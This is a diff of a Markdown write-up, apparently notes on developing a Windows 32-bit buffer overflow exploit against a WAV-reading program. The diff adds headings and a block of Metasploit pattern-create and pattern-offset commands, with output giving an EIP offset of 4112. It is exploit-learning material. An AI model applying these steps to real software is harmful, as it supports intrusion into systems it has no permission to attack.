@@ -8,11 +8,15 @@ python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
 
 ## Controlling EIP
 
+### Creating Unique Pattern
+
 ```
 /usr/bin/msf-pattern_create -l 5000
 
 ERC --pattern c 5000
 ```
+
+### Exploit
 
 win32bof_exploit.py
 
@@ -25,6 +29,15 @@ def eip_offset():
 
 eip_offset()
 ```
+
+### Calculating EIP Offset
+
+```
+/usr/bin/msf-pattern_offset -q 31684630
+
+[*] Exact match at offset 4112
+```
+
 
 ## Indetyfing Bad Characters
 
